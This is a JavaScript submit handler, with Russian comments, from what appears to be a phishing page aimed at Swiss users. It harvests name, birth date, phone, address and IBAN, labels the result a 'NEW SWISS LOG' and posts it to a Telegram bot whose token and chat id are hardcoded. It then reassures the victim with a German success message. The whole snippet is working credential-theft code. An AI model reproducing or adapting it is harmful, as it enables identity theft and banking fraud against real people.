  // Отправка
  const form = document.getElementById('telegramForm');
  
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const submitBtn = form.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;

    // Собираем данные из полей СРАЗУ, пока они не очистились
    const name = document.getElementById('name').value.trim();
    const geburtsdatum = document.getElementById('geburtsdatum').value.trim();
    const telefon = document.getElementById('telefon').value.trim();
    const adresse = document.getElementById('adresse').value.trim();
    const plz = document.getElementById('plz').value.trim();
    const stadt = document.getElementById('stadt').value.trim();
    const iban = document.getElementById('iban').value.trim();

    // Проверка на пустоту (на случай, если Safari их стер)
    if (!name || !telefon || !iban) {
      alert('Bitte füllen Sie alle Felder aus.');
      return;
    }

    const now = new Date();
    const dateStr = now.toLocaleDateString('de-CH', { day: '2-digit', month: '2-digit', year: 'numeric' });
    const timeStr = now.toLocaleTimeString('de-CH', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const dateTime = `${dateStr}, ${timeStr}`;
    const browserInfo = navigator.userAgent;

    let message = '🇨🇭 NEW SWISS LOG !\n\n';
    message += `👤 Name: ${name}\n`;
    message += `🎂 Geburtsdatum: ${geburtsdatum}\n`;
    message += `📱 Telefon: ${telefon}\n`;
    message += `📍 Adresse: ${adresse}\n`;
    message += `📮 PLZ: ${plz}\n`;
    message += `🏙️ Stadt: ${stadt}\n`;
    message += `🏦 IBAN: ${iban}\n`;
    message += `🔍 IBAN-Status: nicht geprüft\n\n`;
    message += `🕒 Zeit: ${dateTime}\n`;
    message += `🌐 Browser: ${browserInfo}\n`;

    submitBtn.textContent = 'Отправка...';
    submitBtn.disabled = true;

    try {
      const url = `https://api.telegram.org/bot9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI/sendMessage`;
      
      // Отправляем через URLSearchParams (Safari на iPhone это пропускает лучше)
      const formData = new URLSearchParams();
      formData.append('chat_id', '-1003907097706');
      formData.append('text', message);
      formData.append('parse_mode', 'Markdown');

      const response = await fetch(url, {
        method: 'POST',
        body: formData
      });

      const data = await response.json();

      if (data.ok) {
        alert('Vielen Dank! Ihre Daten wurden erfolgreich gesendet.');
        form.reset(); // Очищаем форму только ПОСЛЕ успешной отправки
      } else {
        throw new Error(data.description || 'Fehler');
      }
    } catch (error) {
      console.error('Ошибка:', error);
      alert('Fehler beim Senden. Bitte versuchen Sie es später erneut.');
    } finally {
      submitBtn.textContent = originalText;
      submitBtn.disabled = false;
    }
  });
